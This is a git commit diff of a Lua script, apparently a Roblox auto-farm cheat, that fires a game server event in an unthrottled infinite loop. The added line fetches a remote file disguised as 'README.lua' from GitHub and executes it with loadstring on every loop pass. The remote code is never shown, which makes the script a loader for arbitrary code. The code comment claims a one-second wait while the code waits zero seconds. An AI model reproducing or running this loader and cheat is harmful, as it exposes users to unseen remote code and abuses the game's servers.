d23fcbead13fb45f14c81b77ae75cb3a3ca601a7
HUGOHUGOHUGOHUGOHUGOHUGOHUGOHUGO <hugo.augusto2024@gmail.com>
2025-02-21 16:52:04 -0300

    Auto farn.lua

--- Auto farn.lua
+++ Auto farn.lua
@@ -1,5 +1,5 @@
 while true do
     game:GetService("ReplicatedStorage").Events.Cookie:FireServer()
-
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/HUGOHUGOHUGOHUGOHUGOHUGOHUGOHUGO/Cookies/refs/heads/main/README.lua"))()
     wait(0)  -- Aguarda 1 segundo antes de repetir o loop
 end
